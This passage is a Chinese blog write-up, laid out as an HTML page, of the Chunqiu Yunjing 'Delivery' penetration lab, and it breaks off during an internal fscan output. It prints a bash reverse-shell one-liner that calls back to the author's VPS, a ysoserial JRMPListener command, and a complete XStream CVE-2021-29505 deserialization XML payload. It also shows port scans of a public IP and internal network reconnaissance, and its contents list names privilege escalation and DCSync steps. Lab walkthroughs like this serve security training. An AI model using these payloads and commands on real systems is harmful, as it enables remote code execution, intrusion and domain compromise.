@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+<head>
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.19.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://gcore.jsdelivr.net'>
+  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin>
+  <link rel='dns-prefetch' href='//unpkg.com'>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>春秋云镜Delivery-wp - v2ish1yan`s blog</title>
+
+  
+    <meta name="description" content="XStream反序列化反弹shell扫描端口 12345678rustscan -a 39.98.107.194 -r 1-65535Open 39.98.107.194:25Open 39.98.107.194:22Open 39.98.107.194:21Open 39.98.107.194:110Open 39.98.107.194:80Open 39.98.107.194:8080  是一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜Delivery-wp">
+<meta property="og:url" content="http://example.com/2023/10/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Delivery/index.html">
+<meta property="og:site_name" content="v2ish1yan&#96;s blog">
+<meta property="og:description" content="XStream反序列化反弹shell扫描端口 12345678rustscan -a 39.98.107.194 -r 1-65535Open 39.98.107.194:25Open 39.98.107.194:22Open 39.98.107.194:21Open 39.98.107.194:110Open 39.98.107.194:80Open 39.98.107.194:8080  是一">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310260945780.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310260946789.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310260845925.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310260854284.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310260954937.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261034780.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261035784.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261105009.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261110790.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261120866.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261407103.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261422331.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261457706.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261513023.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261514559.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261518205.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261519569.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261529456.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261554290.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261554974.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261555175.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261600210.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261605762.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261616568.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261624776.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261807625.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261808939.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261831389.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261836024.png">
+<meta property="og:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261853537.png">
+<meta property="article:published_time" content="2023-10-26T11:04:59.872Z">
+<meta property="article:modified_time" content="2023-10-26T11:05:53.771Z">
+<meta property="article:author" content="v2ish1yan">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310260945780.png">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+    <link rel="shortcut icon" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120002492.png">
+  
+
+  
+
+  
+
+
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+  
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302120001591.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.4/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">v2ish1yan`s blog</div></a></div>
+
+<nav class="menu dis-select"><a class="nav-item active" href="/">文章</a><a class="nav-item" href="/diary">随笔</a><a class="nav-item" href="/links">社交</a></nav>
+</header>
+
+
+<div class="widgets">
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" data-filter="/blog/" placeholder="文章搜索"><svg t="1670596976048" class="icon search-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"></path></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
+
+
+<widget class="widget-wrapper toc single" id="data-toc"><div class="widget-header cap dis-select"><span class="name">春秋云镜Delivery-wp</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">XStream反序列化反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NFS%E6%8C%82%E8%BD%BDssh%E8%BF%9E%E6%8E%A5"><span class="toc-text">NFS挂载ssh连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#no-root-squash%E7%BC%96%E8%AF%91%E9%AB%98%E6%9D%83%E9%99%90shell"><span class="toc-text">no_root_squash编译高权限shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpstudy%E9%AB%98%E6%9D%83%E9%99%90%E5%86%99%E6%97%A5%E5%BF%97%E9%A9%AC"><span class="toc-text">phpstudy高权限写日志马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9DACL%E8%BF%9B%E8%A1%8CDCSync"><span class="toc-text">修改DACL进行DCSync</span></a></li></ol></div></div></widget>
+
+
+
+
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a></div><div id="post-meta">发布于&nbsp;<time datetime="2023-10-26T11:04:59.872Z">2023-10-26</time></div></div>
+
+<article class='md-text content post'>
+<h1 class="article-title"><span>春秋云镜Delivery-wp</span></h1>
+<h2 id="XStream反序列化反弹shell"><a href="#XStream反序列化反弹shell" class="headerlink" title="XStream反序列化反弹shell"></a>XStream反序列化反弹shell</h2><p>扫描端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rustscan -a 39.98.107.194 -r 1-65535</span><br><span class="line"></span><br><span class="line">Open 39.98.107.194:25</span><br><span class="line">Open 39.98.107.194:22</span><br><span class="line">Open 39.98.107.194:21</span><br><span class="line">Open 39.98.107.194:110</span><br><span class="line">Open 39.98.107.194:80</span><br><span class="line">Open 39.98.107.194:8080</span><br></pre></td></tr></table></figure>
+
+<p>是一个linux主机</p>
+<p>同时存在一个匿名ftp</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310260945780.png" alt="image-20231026094508718" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026094508718</span></div></div>
+
+<p>从pom.xml得知了网站的依赖项</p>
+<p>使用了cc3.2.1和xstream1.4.16</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310260946789.png" alt="image-20231026094647718" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026094647718</span></div></div>
+
+<p>80端口是apache的默认页面，8080端口是正常web页面</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310260845925.png" alt="image-20231026084508677" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026084508677</span></div></div>
+
+<p>其数据包格式为xm</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310260854284.png" alt="image-20231026085113791" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026085113791</span></div></div>
+
+<p>应该就是利用xstream的漏洞<a target="_blank" rel="noopener" href="https://x-stream.github.io/CVE-2021-29505.html">CVE-2021-29505</a>，配合cc链打反序列化，参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/286739.html">CVE-2021-29505 XStream</a></p>
+<p>先将bash命令进行base64编码，工具站：<a target="_blank" rel="noopener" href="https://ares-x.com/tools/runtime-exec/">https://ares-x.com/tools/runtime-exec/</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i&gt;&amp; /dev/tcp/38.xxx.xxx.171/9001 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310260954937.png" alt="image-20231026095457858" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026095457858</span></div></div>
+
+<p>然后vps用ysoserial开启监听，并指定cc链，因为cc6不受jdk版本限制，所以优先使用cc6</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-all.jar ysoserial.exploit.JRMPListener 1001 CommonsCollections6 <span class="string">&quot;base64编码shell&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>官方poc有些问题，参考<a target="_blank" rel="noopener" href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E5%AF%B9%E8%B1%A1/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/web%E7%BB%84%E4%BB%B6/XStream/CVE-2021-29505/XStream-CVE-2021-29505-poc%E4%BF%AE%E6%AD%A3.html">XStream CVE-2021-29505 poc修正</a></p>
+<p>payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: none<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">parsedMessage</span>&gt;</span>true<span class="tag">&lt;/<span class="name">parsedMessage</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">soapVersion</span>&gt;</span>SOAP_11<span class="tag">&lt;/<span class="name">soapVersion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bodyParts</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">sm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">attachmentsInitialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">attachmentsInitialized</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">multiPart</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">soapPart</span>/&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mm</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">it</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">aliases</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">candidates</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">names</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">ctx</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">environment</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">registry</span> <span class="attr">class</span>=<span class="string">&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>UnicastRef<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>vpsid<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>vpsport<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">short</span>&gt;</span>0<span class="tag">&lt;/<span class="name">short</span>&gt;</span></span><br><span class="line">                                                        <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>false<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                                                    <span class="tag">&lt;/<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;/<span class="name">registry</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">host</span>&gt;</span>vpsip<span class="tag">&lt;/<span class="name">host</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">port</span>&gt;</span>vpsport<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">ctx</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">candidates</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">aliases</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">it</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">mm</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">multiPart</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">sm</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到shell，而且还是root权限</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261034780.png" alt="image-20231026103453754" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026103453754</span></div></div>
+
+<p>得到flag01: flag{fd90fa8f-a0c4-4b58-abcd-c4eaf971df04}</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310261035784.png" alt="image-20231026103522743" fancybox="true"/></div><div class="image-meta"><span class="image-caption center">image-20231026103522743</span></div></div>
+
+<h2 id="NFS挂载ssh连接"><a href="#NFS挂载ssh连接" class="headerlink" title="NFS挂载ssh连接"></a>NFS挂载ssh连接</h2><p>上传fscan扫描内网</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">./fscan_386 -h 172.22.13.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.2</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.13.6     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.13.14    is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.13.28    is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.13.57    is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 4</span></span><br><span class="line"><span class="string">172.22.13.6:135 open</span></span><br><span class="line"><span class="string">172.22.13.6:88 open</span></span><br><span class="line"><span class="string">172.22.13.14:8080 open</span></span><br><span class="line"><span class="string">172.22.13.28:8000 open</span></span><br><span class="line"><span class="string">172.22.13.28:3306 open</span></span><br><span class="line"><span class="string">172.22.13.28:445 open</span></span><br><span class="line"><span class="string">172.22.13.6:445 open</span></span><br><span class="line"><span class="string">172.22.13.28:139 open</span></span><br><span class="line"><span class="string">172.22.13.14:21 open</span></span><br><span class="line"><span class="string">172.22.13.6:139 open</span></span><br><span class="line"><span class="string">172.22.13.28:135 open</span></span><br><span class="line"><span class="string">172.22.13.28:80 open</span></span><br><span class="line"><span class="string">172.22.13.57:80 open</span></span><br><span class="line"><span class="string">172.22.13.57:22 open</span></span><br><span class="line"><span class="string">172.22.13.14:80 open</span></span><br><span class="line"><span class="string">172.22.13.14:22 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 16</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] WebTitle: http://172.22.13.14       code:200 len:10918  title:Apache2 Ubuntu Default Page: It works</span></span><br><span class="line"><span class="string">[*] WebTitle: 